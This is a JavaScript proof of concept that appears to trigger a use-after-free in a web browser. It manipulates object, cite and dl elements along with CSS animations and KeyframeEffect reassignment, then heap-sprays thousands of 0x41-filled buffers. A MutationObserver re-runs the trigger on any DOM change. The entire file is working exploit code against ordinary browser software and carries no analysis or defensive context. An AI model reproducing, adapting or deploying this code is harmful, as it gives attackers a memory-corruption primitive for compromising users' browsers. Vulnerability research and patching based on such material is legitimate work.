import { debug_log } from './module/utils.mjs';

const object = document.querySelector("object");
const cite = document.querySelector("cite");
const dl = document.querySelector("dl");

function heapSpray() {
  const spray = [];
  for (let i = 0; i < 0x1000; i++) {
    let arr = new Uint8Array(0x1000);
    arr.fill(0x41);
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  debug_log("Initiating PoC B...");
  object.data = "x";
  cite.style.animationIterationCount = "infinite";
  setTimeout(() => {
    let animation = cite.getAnimations()[0];
    object.width = "1em";
    try {
      object.codeBase;
    } catch {}
    animation.effect = new KeyframeEffect(dl, {});
    heapSpray();
    debug_log("UAF triggered. Check for crash or visual artifacts.");
  }, 0);
}

const observer = new MutationObserver(() => {
  debug_log("DOM modified.");
  triggerUAF();
});

observer.observe(object, { childList: true, subtree: true });
